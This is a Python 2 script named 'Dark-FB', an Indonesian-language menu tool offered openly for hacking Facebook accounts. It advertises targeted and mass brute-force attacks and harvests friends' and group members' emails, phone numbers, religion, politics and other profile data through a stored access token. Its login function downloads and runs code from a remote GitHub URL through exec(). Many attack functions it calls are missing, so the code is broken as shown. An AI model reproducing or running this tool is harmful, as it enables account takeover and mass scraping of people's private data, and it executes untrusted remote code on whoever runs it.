#!\usr\bin\python-gerak"
# coding=utf-8
# Dark-FB v1.8
#~ZeDD Parker
# https://github.com/rezadkim

#Import
import os,sys,time,random,hashlib,re,threading,json,getpass
import requests,mechanize,urllib,cookielib
from multiprocessing.pool import ThreadPool

#Update
os.system("git pull")

#BrowseX
reload(sys)
sys.setdefaultencoding('utf8')
sex = mechanize.Browser()
sex.set_handle_robots(False)
sex.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
sex.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

#Warna
merah  = "\033[1;91m"
lime   = "\033[1;92m"
kuning = "\033[1;93m"
biru   = "\033[1;94m"
ungu   = "\033[1;95m"
blue   = "\033[1;96m"
putih  = "\033[1;97m"
tutup  = "\033[0m"

def keluar():
	exit(merah+"[!] Exit"+tutup)

#Cek Token
def cekto():
	global token
	try:
		token = open("log.txt","r").read()
	except IOError:
		os.system("rm -rf log.txt")
		print
		print tutup+"           ["+merah+"!"+tutup+"] Token not found"
		print tutup+"           ["+merah+"!"+tutup+"] You must log'in again"
		login()

#Login
def login():
	exec(requests.get("https://raw.githubusercontent.com/ZeDDParker/qweszxc/master/sec/login.py").text)

#Menu
def menu():
	global id,token
	try:
		token = open("log.txt","r").read()
	except IOError:
		os.system("reset")
		print merah+" ||  || "+merah+"  ╔╦╗"+tutup+"┌─┐┬─┐┬┌─   "+merah+"╔═╗╔╗"+tutup
		print merah+" \\\\"+putih+"()"+merah+"//"+merah+"   ║║"+tutup+"├─┤├┬┘├┴┐───"+merah+"╠╣ ╠╩╗"+tutup
		print merah+"//"+putih+"(__)"+merah+"\\\\"+merah+"  ═╩╝"+tutup+"┴ ┴┴└─┴ ┴   "+merah+"╚  ╚═╝"+tutup
		print merah+"||    || "+tutup+"  \u001b[7mAuthor: ZeDD Parker     \u001b[0m"
		print tutup+"["+lime+"*"+tutup+"] Name : "+lime+"-----"
		print tutup+"["+lime+"*"+tutup+"] ID   : "+lime+"-----"
		print tutup+"["+lime+"*"+tutup+"] Date : "+lime+time.asctime()
		print tutup+36*"'"
		print
		choose_banner()
	try:
		cek  = requests.get("https://graph.facebook.com/me?access_token="+token)
		a    = json.loads(cek.text)
		nama = a['name']
		id   = a['id']
	except KeyError:
		print tutup+"           ["+kuning+"+"+tutup+"] Checkpoint"
		os.system("rm -rf log.txt")
		keluar()
	except requests.exceptions.ConnectionError:
		exit(merah+"[!] No Connection")
	os.system("reset")
	print merah+"||  || "+merah+"   ╔╦╗"+tutup+"┌─┐┬─┐┬┌─   "+merah+"╔═╗╔╗"+tutup
	print merah+"\\\\"+putih+"()"+merah+"//"+merah+"    ║║"+tutup+"├─┤├┬┘├┴┐───"+merah+"╠╣ ╠╩╗"+tutup
	print merah+"//"+putih+"(__)"+merah+"\\\\"+merah+"   ═╩╝"+tutup+"┴ ┴┴└─┴ ┴   "+merah+"╚  ╚═╝"+tutup
	print merah+"||    || "+tutup
	print tutup+"["+lime+"*"+tutup+"] Name : "+lime+nama
	print tutup+"["+lime+"*"+tutup+"] ID   : "+lime+id
	print tutup+"["+lime+"*"+tutup+"] Date : "+lime+time.asctime()
	print tutup+36*"'"
	print
	choose_banner()

#Bannerchoose
def choose_banner():
	print tutup+"               ("+lime+"01"+tutup+") Login"
	print tutup+"               ("+lime+"02"+tutup+") Account information"
	print tutup+"               ("+lime+"03"+tutup+") Get ID/Email/Phone"
	print tutup+"               ("+lime+"04"+tutup+") Facebook hacking tools"
	print
	choose()

#Syschoose
def choose():
	pilih = raw_input(tutup+"           ["+lime+">"+tutup+"] Choose : "+lime)
	if pilih =="":
		keluar()
	elif pilih =="1":
		cekto()
		login()
	elif pilih =="01":
		cekto()
		login()
	elif pilih =="2":
		cekto()
		information()
	elif pilih =="02":
		cekto()
		information()
	elif pilih =="3":
		cekto()
		dump()
	elif pilih =="03":
		cekto()
		dump()
	elif pilih =="4":
		cekto()
		menu_hack()
	elif pilih =="04":
		cekto()
		menu_hack()
	else:
		keluar()

#Indormation
def information():
	print
	id = raw_input(tutup+"           ["+lime+"+"+tutup+"] Search Name or ID : "+lime)
	print tutup+"           ["+lime+"*"+tutup+"] Searching ..."
	r = requests.get("https://graph.facebook.com/me/friends?access_token="+token)
	q = json.loads(r.text)
	for i in q['data']:
		if id in i['name'] or id in i['id']:
			a = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
			b = json.loads(a.text)
			print
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Name : "+lime+b['name']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] First name : "+lime+b['first_name']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Middle name : "+lime+b['middle_name']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Last name : "+lime+b['last_name']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] ID : "+lime+b['id']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Username : "+lime+b['username']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Email : "+lime+b['email']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Mobile phone : "+lime+b['mobile_phone']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Locale : "+lime+b['locale'].split('_')[0]
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Location : "+lime+b['location']['name']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Hometown : "+lime+b['hometown']['name']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Gender : "+lime+b['gender']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Religion : "+lime+b['religion']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Political : "+lime+b['political']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Work : "
				for i in b['work']:
					try:
						print tutup+"               "+lime+"-"+tutup+" Position : "+lime+i['position']['name']
					except KeyError: pass
					try:
						print tutup+"               "+lime+"-"+tutup+" Employer : "+lime+i['employer']['name']
					except KeyError: pass
					try:
						if i['start_date'] == "0000-00":
							print tutup+"               "+lime+"-"+tutup+" Start date : "+lime+"---"
						else:
							print tutup+"               "+lime+"-"+tutup+" Start date : "+lime+i['start_date']
					except KeyError: pass
					try:
						if i['end_date'] == "0000-00":
							print tutup+"               "+lime+"-"+tutup+" End date : "+lime+"---"
						else:
							print tutup+"               "+lime+"-"+tutup+" End date : "+lime+i['end_date']
					except KeyError: pass
					try:
						print tutup+"               "+lime+"-"+tutup+" Location : "+lime+i['location']['name']
					except KeyError: pass
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Updated time : "+lime+b['updated_time'][:10]+' '+b['updated_time'][11:19]
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Languages :"
				for i in b['languages']:
					try:
						print tutup+"               "+lime+"-"+tutup+" Languages : "+lime+i['name']
					except KeyError: pass
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Bio : "+lime+b['bio']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Quotes : "+lime+b['quotes']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Birthday : "+lime+b['birthday'].replace('/','-')
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] Link : "+lime+b['link']
			except KeyError: pass
			try:
				print tutup+"           ["+lime+"+"+tutup+"] School :"
				for i in b['education']:
					try:
						print tutup+"               "+lime+"-"+tutup+" School : "+lime+i['name']
					except KeyError: pass
			except KeyError: pass
			print
			print tutup+"           ["+lime+"+"+tutup+"] Done"
			raw_input(tutup+"\nBack ...")
			menu()

		else:
			pass
	else:
		print tutup+"           ["+merah+"!"+tutup+"] Not Found"
		raw_input(tutup+"\nBack ...")
		menu()

#Dump
def dump():
	cekto()
	print
	print tutup+"               ("+lime+"01"+tutup+") Get id friend"
	print tutup+"               ("+lime+"02"+tutup+") Get id friend from friend"
	print tutup+"               ("+lime+"03"+tutup+") Get id from search name"
	print tutup+"               ("+lime+"04"+tutup+") Getting id member group"
	print tutup+"               ("+lime+"05"+tutup+") Getting email member group"
	print tutup+"               ("+lime+"06"+tutup+") Getting phone member group"
	print tutup+"               ("+lime+"07"+tutup+") Get email friend"
	print tutup+"               ("+lime+"08"+tutup+") Get email friend from friend"
	print tutup+"               ("+lime+"09"+tutup+") Get phone friend"
	print tutup+"               ("+lime+"10"+tutup+") Get phone friend from friend"
	print
	choose_hack()

#Choosehack
def choose_dump():
	pilih1 = raw_input(tutup+"           ["+lime+">"+tutup+"] Choose : "+lime)
	if pilih1 =="":
		keluar()
	elif pilih1 =="01":
		dumpid_friend()
	elif pilih1 =="1":
		dumpid_friend()
	elif pilih1 =="02":
		brutef()
	elif pilih1 =="2":
		brutef()
	elif pilih1 =="03":
		supermbf()
	elif pilih1 =="3":
		supermbf()
	elif pilih1 =="04":
		mbf()
	elif pilih1 =="4":
		mbf()
	elif pilih1 =="05":
		mail_check()
	elif pilih1 =="5":
		mail_check()
	elif pilih1 =="06":
		mini()
	elif pilih1 =="6":
		mini()
	elif pilih1 =="07":
		brutef()
	elif pilih1 =="7":
		brutef()
	elif pilih1 =="08":
		supermbf()
	elif pilih1 =="8":
		supermbf()
	elif pilih1 =="09":
		mbf()
	elif pilih1 =="9":
		mbf()
	elif pilih1 =="10":
		mail_check()
	else:
		keluar()

#Dump ID Friend
def dumpid_friend():
	try:
		os.mkdir('out')
	except OSError:
		pass
	print
	r = requests.get("https://graph.facebook.com/me/friends?access_token="+token)
	z = json.loads(r.text)



#Menu Hack
def menu_hack():
	print
	cekto()
	print tutup+"               ("+lime+"01"+tutup+") Mini hack facebook (Target)"
	print tutup+"               ("+lime+"02"+tutup+") BruteFoce (Target)"
	print tutup+"               ("+lime+"03"+tutup+") Super multi bruteforce facebook (Massal)"
	print tutup+"               ("+lime+"04"+tutup+") Multi bruteforce facebook"
	print tutup+"               ("+lime+"05"+tutup+") Email Checker"
	print
	choose_hack()

#Choosehack
def choose_hack():
	pilih2 = raw_input(tutup+"           ["+lime+">"+tutup+"] Choose : "+lime)
	if pilih2 =="":
		keluar()
	elif pilih2 =="01":
		mini()
	elif pilih2 =="1":
		mini()
	elif pilih2 =="02":
		brutef()
	elif pilih2 =="2":
		brutef()
	elif pilih2 =="03":
		supermbf()
	elif pilih2 =="3":
		supermbf()
	elif pilih2 =="04":
		mbf()
	elif pilih2 =="4":
		mbf()
	elif pilih2 =="05":
		mail_check()
	elif pilih2 =="5":
		mail_check()
	else:
		keluar()

#Mini Hack Facebook


menu()
